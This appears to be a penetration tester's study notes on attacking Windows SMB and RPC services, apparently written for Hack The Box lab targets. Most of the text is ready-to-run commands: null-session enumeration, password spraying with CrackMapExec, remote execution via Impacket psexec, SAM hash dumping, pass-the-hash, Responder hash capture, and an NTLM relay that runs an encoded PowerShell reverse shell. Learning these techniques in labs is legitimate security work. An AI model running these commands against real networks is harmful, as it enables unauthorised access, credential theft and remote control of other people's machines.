## Enumeration
```shell-session
sudo nmap 10.129.14.128 -sV -sC -p139,445
```

## Misconfigurations
SMB does not always need authentication (null session). I.E. no username, no password for logging into a system.

#### Anonymous Authentication
Clients that allow null sessions:
1. smbclient
2. smbmap
3. rpcclient
4. enum4linux

##### File Share
Using `smbclient`:

| Switch | Desc             |
| ------ | ---------------- |
| `-L`   | List shares      |
| `-N`   | Use null session |
*Example:*
```shell-session
wannacrye@htb[/htb]$ smbclient -N -L //10.129.14.128

        Sharename       Type      Comment
        -------      --     -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        notes           Disk      CheckIT
        IPC$            IPC       IPC Service (DEVSM)
SMB1 disabled no workgroup available
```

Using `smbmap`:

| Switch       | Desc      |
| ------------ | --------- |
| `-r` or `-R` | Recursive |

*Example:*
```shell-session
wannacrye@htb[/htb]$ smbmap -H 10.129.14.128

[+] IP: 10.129.14.128:445     Name: 10.129.14.128                                   
        Disk                                                    Permissions     Comment
        --                                                   ---------    -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       IPC Service (DEVSM)
        notes                                                   READ, WRITE     CheckIT
```

*or recursively search notes:*
```shell-session
wannacrye@htb[/htb]$ smbmap -H 10.129.14.128 -r notes

[+] Guest session       IP: 10.129.14.128:445    Name: 10.129.14.128                           
        Disk                                                    Permissions     Comment
        --                                                   ---------    -------
        notes                                                   READ, WRITE
        .\notes\*
        dr--r--r               0 Mon Nov  2 00:57:44 2020    .
        dr--r--r               0 Mon Nov  2 00:57:44 2020    ..
        dr--r--r               0 Mon Nov  2 00:57:44 2020    LDOUJZWBSG
        fw--w--w             116 Tue Apr 16 07:43:19 2019    note.txt
        fr--r--r               0 Fri Feb 22 07:43:28 2019    SDT65CB.tmp
        dr--r--r               0 Mon Nov  2 00:54:57 2020    TPLRNSMWHQ
        dr--r--r               0 Mon Nov  2 00:56:51 2020    WDJEQFZPNO
        dr--r--r               0 Fri Feb 22 07:44:02 2019    WindowsImageBackup
```

*the notes directory is `read/write` so we can upload and download files:*
```shell-session
smbmap -H 10.129.14.128 --download "notes\note.txt"
```

```shell-session
smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"
```

##### Remote Procedure Call (RPC)
**Tool:** `rpcclient`
**Desc:** The `rpcclient` tool offers us many different commands to execute specific functions on the SMB server to gather information or modify server attributes like a username. We can use this [cheat sheet from the SANS Institute](https://www.willhackforsushi.com/sec504/SMB-Access-from-Linux.pdf) or review the complete list of all these functions found on the [man page](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html) of the `rpcclient`.

```shell-session
wannacrye@htb[/htb]$ rpcclient -U'%' 10.10.110.17

rpcclient $> enumdomusers

user:[mhope] rid:[0x641]
user:[svc-ata] rid:[0xa2b]
user:[svc-bexec] rid:[0xa2c]
user:[roleary] rid:[0xa36]
user:[smorgan] rid:[0xa37]
```

###### Enum4Linux
Utilizes `nmblookup`, `net`, `rpcclient`, and `smbclient` to:
- Workgroup/Domain name
- Users information
- Operating system information
- Groups information
- Shares Folders
- Password policy information

```shell-session
wannacrye@htb[/htb]$ ./enum4linux-ng.py 10.10.11.45 -A -C
```

## Protocol Specific Attacks
In case a null session isn't an option.

1. Brute forcing
2. Password spraying

==Brute forcing== is not recommended unless we know the account lockout policy.

==Password spraying== is a better alternative, typically 2-3 attempts is considered safe.

##### CrackMapExec (CME)
```shell-session
wannacrye@htb[/htb]$ crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' --local-auth
```

| Switch                  | Desc                                          |
| ----------------------- | --------------------------------------------- |
| `smb`                   | mode                                          |
| `-u` or `-U`            | username or list                              |
| `-p` or `-P`            | password or list                              |
| `--local-auth`          | option for non-domain joined computers        |
| `--continue-on-success` | keep spraying even after a valid set is found |
### SMB
#### Remote Code Execution (RCE)
Tools Overview:
- [Impacket PsExec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py) - Python PsExec like functionality example using [RemComSvc](https://github.com/kavika13/RemCom).
- [Impacket SMBExec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py) - A similar approach to PsExec without using [RemComSvc](https://github.com/kavika13/RemCom). The technique is described here. This implementation goes one step further, instantiating a local SMB server to receive the output of the commands. This is useful when the target machine does NOT have a writeable share available.
- [Impacket atexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py) - This example executes a command on the target machine through the Task Scheduler service and returns the output of the executed command.
- [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) - includes an implementation of `smbexec` and `atexec`.
- [Metasploit PsExec](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/windows/smb/psexec.md) - Ruby PsExec implementation.

##### Impacket PsExec
To connect to a remote machine with a local administrator account:
```shell-session
impacket-psexec administrator:'Password123!'@10.10.110.17
```

`impacket-smbexec` and `impacket-atexec` follow the same rules.

##### CrackMapExec (CME)
Advantage is run a command on multiple hosts at the same time.

```shell-session
crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec
```

| Switch          | Desc                                        |
| --------------- | ------------------------------------------- |
| `-u`            | username                                    |
| `-p`            | password                                    |
| `-x` or `-X`    | execute this command with cmd or PowerShell |
| `--exec-method` | if not defined, atexec will run             |
###### Enumerating Logged-on Users
This command will check for all logged on users for each machine in the 10.10.110.0/24 range.
```shell-session
crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users
```

###### Extract Hashes from SAM
Useful for:
- Authenticate as another user.
- Password Cracking, if we manage to crack the password, we can try to reuse the password for other services or accounts.
- Pass The Hash

```shell-session
crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam
```

###### Pass-the-Hash (PtH)
If we get the NTLM hash but can't crack we can use `Impacket`, `SMBMap`, or `CrackMapExec`.

*CrackMapExec example:*
```shell-session
crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE
```

###### Forced Authentication Attacks
Fake an SMB server to collect users' [NetNTLM v1/v2 hashes](https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4)

**Tool:** [Responder](https://github.com/lgandx/Responder)
**Desc:** LLMNR, NBT-NS, and MDNS poisoner. It will find LLMNR and NBT-NS traffic and respond to a victim, capturing their hashes.

*Example:*
```shell-session
responder -I <interface name>
```

All responder's captured hashes are located in `/usr/share/responder/logs/`.
We can crack hashes using `-m 5600` in `hashcat`.

*If the hash cannot be cracked we can potentially relay the hash to another machine using  [impacket-ntlmrelayx](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py) or Responder [MultiRelay.py](https://github.com/lgandx/Responder/blob/master/tools/MultiRelay.py)*:

Step 1:
Turn SMB **off**. `/etc/responder/Responder.conf`

Step 2:
Execute `impacket-ntlmrelayx` with the option `--no-http-server`, `-smb2support`. `-t` is the target machine. We can execute commands with `-c`.
```shell-session
impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146
```

*Example of executing a reverse powershell on target using  [https://www.revshells.com/](https://www.revshells.com/) with the option Powershell #3 (Base64):*
***Start `nc -lvnp <port>` on attack box***

```shell-session
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e JABjAGwAaQBlAG4AdAAgADQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAb... SNIP ...oACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA'
```

### RPC
[[00 - notes/Kali Notes/Footprinting]]

**Uses:** 
- Change a user's password
- Create a new domain user
- Create a new shared folder

[SMB Access from Linux Cheat Sheet](https://www.willhackforsushi.com/sec504/SMB-Access-from-Linux.pdf)

